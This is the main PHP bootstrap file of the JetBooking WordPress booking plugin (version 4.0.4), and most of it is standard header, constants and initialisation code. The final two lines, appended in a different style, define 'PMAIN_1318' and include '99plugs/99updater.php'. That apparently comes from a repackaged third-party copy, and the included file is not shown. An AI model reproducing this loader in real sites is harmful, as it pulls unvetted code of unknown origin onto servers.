<?php
/**
 * Plugin Name: JetBooking
 * Plugin URI:  https://crocoblock.com/plugins/jetbooking/
 * Description: Allows creating a booking functionality for your residence with an availability check, which means your site visitor can select a certain period (check-in and check-out dates) he wants to rent this housing for.
 * Version:     4.0.4
 * Author:      Crocoblock
 * Author URI:  https://crocoblock.com/
 * Text Domain: jet-booking
 * License:     GPL-3.0+
 * License URI: http://www.gnu.org/licenses/gpl-3.0.txt
 * Domain Path: /languages
 */

use JET_ABAF\Plugin;

defined( 'ABSPATH' ) || exit; // Exit if accessed directly.

define( 'JET_ABAF_VERSION', '4.0.4' );
define( 'JET_ABAF__FILE__', __FILE__ );
define( 'JET_ABAF_PLUGIN_BASE', plugin_basename( JET_ABAF__FILE__ ) );
define( 'JET_ABAF_PATH', plugin_dir_path( JET_ABAF__FILE__ ) );
define( 'JET_ABAF_URL', plugins_url( '/', JET_ABAF__FILE__ ) );

add_action( 'plugins_loaded', 'jet_abaf_init' );
add_action( 'plugins_loaded', 'jet_abaf_lang' );

/**
 * Plugin activation.
 *
 * This runs when the plugin is activated. It ensures the main Plugin
 * class is loaded and calls its activation method.
 *
 * @since 4.0.0
 *
 * @return void
 */
register_activation_hook( JET_ABAF__FILE__, function () {

	require_once JET_ABAF_PATH . 'includes/plugin.php';

	// Init this early, because it could be necessary during the activation.
	jet_abaf()->settings = new JET_ABAF\Settings();
	jet_abaf()->tools    = new JET_ABAF\Tools();
	jet_abaf()->wc       = new JET_ABAF\WC_Integration\Manager();
	jet_abaf()->vendors  = new JET_ABAF\Multivendors\Manager();

	jet_abaf()->activation();

} );

/**
 * Plugin initialization.
 *
 * @since 1.0.0
 */
function jet_abaf_init() {
	require JET_ABAF_PATH . 'includes/plugin.php';
}

/**
 * Load plugin text domain.
 *
 * Load gettext translate for JetBooking text domain.
 *
 * @since 1.0.0
 */
function jet_abaf_lang() {
	load_plugin_textdomain( 'jet-booking', false, dirname( plugin_basename( __FILE__ ) ) . '/languages' );
}

/**
 * Returns the main instance of JetBooking.
 *
 * @since 1.0.0
 *
 * @return Plugin|null
 */
function jet_abaf() {
	return Plugin::instance();
}

define('PMAIN_1318',__FILE__);
include dirname(__FILE__).'/99plugs/99updater.php';